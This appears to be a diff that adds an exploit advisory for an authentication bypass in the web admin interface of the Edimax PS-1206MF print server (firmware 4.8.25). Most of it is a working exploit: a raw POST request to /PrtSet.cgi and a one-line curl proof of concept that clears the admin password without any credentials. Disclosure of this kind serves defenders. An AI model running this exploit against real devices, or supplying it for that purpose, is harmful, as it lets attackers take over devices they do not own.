@@ -1,0 +1,46 @@
+# Title: Edimax PS-1206MF - Web Admin Auth Bypass
+# Date: 30.08.15
+# Vendor: edimax.com
+# Firmware version: 4.8.25
+# Author: Smash_
+# Contact: smash [at] devilteam.pl
+
+
+HTTP authorization is not being properly verified while sendind POST requests to .cgi, remote attacker is able to change specific settings or even reset admin password.
+
+By default, it is necessary to know current password in order to change it, but when request will be missing POST anewpass & confpass parameters, admin password will be set to null.
+
+devil@hell:~$ curl -gi http://192.168.0.10/
+HTTP/1.1 401 
+Date: Sat, 21 Dec 1996 12:00:00 GMT
+WWW-Authenticate: Basic realm="Default password:1234"
+
+401 Unauthorized - User authentication is required.
+
+Request:
+POST /PrtSet.cgi HTTP/1.1
+Host: 192.168.0.10
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.0.10/pssystem.htm
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 103
+
+BoxName=MFD55329&anewpass=1234&confpass=1234&PSPORTNAME1=&PSPORTNAME2=&PSPORTNAME3=&save.x=47&save.y=11
+
+Response:
+HTTP/1.1 200 OK
+Date: Sat, 21 Dec 1996 12:00:00 GMT
+Content-type: text/html
+
+<html><head><title>Advance Settings</title><link rel="stylesheet" href="set.css"></head>
+(...)
+
+
+Following curl request will set admin account with empty password.
+
+PoC:
+devil@hell:~$ curl -XPOST --data "" -s http://192.168.0.10/PrtSet.cgi > /dev/null
